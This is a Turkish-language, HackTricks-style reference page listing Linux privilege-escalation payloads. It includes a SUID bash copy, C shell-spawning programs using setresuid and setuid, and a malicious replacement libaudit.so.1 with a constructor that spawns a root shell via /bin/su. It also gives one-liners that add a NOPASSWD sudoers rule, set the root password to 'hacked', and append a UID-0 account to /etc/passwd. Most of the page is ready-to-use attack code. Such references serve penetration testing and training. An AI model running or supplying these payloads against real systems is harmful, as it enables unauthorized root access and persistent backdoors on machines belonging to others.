# Çalıştırılacak Payload'lar

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p`, privileged mode'u etkinleştirir: Bash farklı gerçek ve etkin kimliklerle başlatıldığında, etkin kimliği gerçek kimliğe sıfırlamaz. Ortaya çıkan shell yine çağıranın mevcut kimlik bilgilerine bağlıdır.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid`, izin verildiğinde gerçek, etkin ve kaydedilmiş kimlikleri değiştirirken `setuid`, etkin kimliği değiştirir ve ayrıcalıklı bir çağıran için gerçek ve kaydedilmiş kimlikleri de ayarlayabilir. `execve`, mevcut process image'ını istenen programla değiştirir.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Bu örneklerde dönüş değeri kontrolleri gösterilmemiştir; her iki credential çağrısı da UID 0 için bile başarısız olabilir.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Ayrıcalıkları yükseltmek için bir dosyanın üzerine yazma

### Yaygın dosyalar

Bunlar yaygın yerel ayrıcalık denetimi dosyaları ve arayüzleridir: `/etc/passwd` yedi alanlı hesap kayıtlarını depolar, `/etc/shadow` isteğe bağlı şifrelenmiş parola verilerini depolar, `sudoers` sudo ayrıcalıklarını ve `NOPASSWD` gibi etiketleri tanımlar ve Docker'ın varsayılan daemon endpoint'i `/var/run/docker.sock` konumundaki bir Unix socket'tir; bu socket'e erişim, host üzerinde root düzeyinde denetim sağlayabilir.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Parolası olan kullanıcıyı _/etc/passwd_ dosyasına ekle
- _/etc/shadow_ içindeki parolayı değiştir
- Kullanıcıyı _/etc/sudoers_ dosyasında sudoers'a ekle
- Genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ konumunda bulunan docker socket üzerinden Docker'ı abuse et

### Bir kütüphanenin üzerine yazma

Bir binary'nin hangi shared library'leri kullandığını kontrol et; bu örnekte `/bin/su` dosyasını `ldd` ile incele.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd`, shared-object bağımlılıklarını raporlar; dinamik linker ise bunları runtime sırasında yüklemek için ELF metadata'sını ve arama kurallarını kullanır.<sup>[[9]](#references)[[10]](#references)</sup>

Bir adayı incelemek için `objdump -T` kullanarak `su` komutunun dynamic symbol table'ını yazdırın ve audit adlarını filtreleyin.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` ve `audit_log_acct_message`, libaudit işlevleridir; `audit_fd` ise bu çıktıda `su`'nun `.bss` bölümünde tanımlanmış bir veri nesnesi olarak gösterilir.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Bir replacement library, loader'ın çözdüğü tanımsız semboller için uyumlu tanımlar export etmelidir; uyuşmayan işlev/veri ABI'ları, bu semboller relocate edildiğinde veya çağrıldığında işlemin yine de başarısız olmasına neden olabilir.<sup>[[10]](#references)[[11]](#references)</sup>

GCC'nin `constructor` attribute'u, desteklenen hedeflerde `main`'den önce `inject` işlevinin otomatik olarak çağrılmasını sağlar.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Değiştirme, ayrıcalıklı bir **`/bin/su`** işlemi tarafından başarıyla yüklenirse bu constructor, ilgili işlemin ayrıcalıklarıyla **`/bin/bash`** başlatabilir; kesin sonuç ortama bağlıdır.<sup>[[10]](#references)[[15]](#references)</sup>

## Scriptler

root'a bir şey çalıştırmasını sağlayabilir misiniz?

`sudoers`, policy girdilerinde `NOPASSWD` etiketini kullanır, `chpasswd` standart girdiden `user:password` çiftlerini okur ve `/etc/passwd` iki nokta üst üste ile ayrılmış yedi hesap alanı kullanır; aşağıdaki örnekler, ilgili dosyaların bunları çalıştıran işlem tarafından yazılabilir olduğunu varsayar.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data to sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **root parolasını değiştir**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd dosyasına yeni root kullanıcısı ekleme

Son payload, oluşturulan `crypt` hash'ini kabul eden bir target'a bağlıdır: Debian'ın `mkpasswd -m sha-512` komutu SHA-512 crypt (`$6$`) ile eşleşirken OpenSSL'in `passwd -1 -salt` komutu MD5 tabanlı BSD algoritmasını (`$1$`) kullanır.<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Set Yerleşik Komutu (Bash Referans Kılavuzu)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Docker daemon socket'ını koruma](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker Belgeleri](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Yaygın Öznitelikler (GNU Compiler Collection Kullanımı)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian Kaynak Kodları](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL Belgeleri](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
